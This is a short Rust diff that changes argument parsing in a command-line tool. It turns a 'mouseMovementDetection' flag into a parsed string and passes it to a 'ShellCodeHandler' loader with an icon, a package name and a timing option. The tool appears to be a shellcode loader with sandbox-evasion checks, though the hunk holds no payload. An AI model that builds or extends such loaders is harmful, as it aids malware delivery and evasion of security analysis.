@@ -94,9 +94,10 @@ fn main() {
         }
         let string = String::from("3600");
         let op_time = sub_m.get_one::<String>("opTime").or_else(||Some(&string)).unwrap().clone();
-        let mouse_movement_detection = sub_m.get_one::<bool>("mouseMovementDetection").or_else(||Some(&true)).unwrap().clone();
+        let string = String::from("true");
+        let mouse_movement_detection = sub_m.get_one::<String>("mouseMovementDetection").or_else(||Some(&string)).unwrap().clone();
 
-        let shell_code_loader = ShellCodeHandler { file_path: fp, package_name: name, ico, op_time:op_time.clone().parse().unwrap(), mouse_movement_detection };
+        let shell_code_loader = ShellCodeHandler { file_path: fp, package_name: name, ico, op_time:op_time.clone().parse().unwrap(), mouse_movement_detection:mouse_movement_detection.parse().unwrap() };
         shell_code_loader.load();
     } else if let Some(sub_m_1) = matches.subcommand_matches("bundle") {
         let fp = sub_m_1.get_one::<String>("file").unwrap().clone();
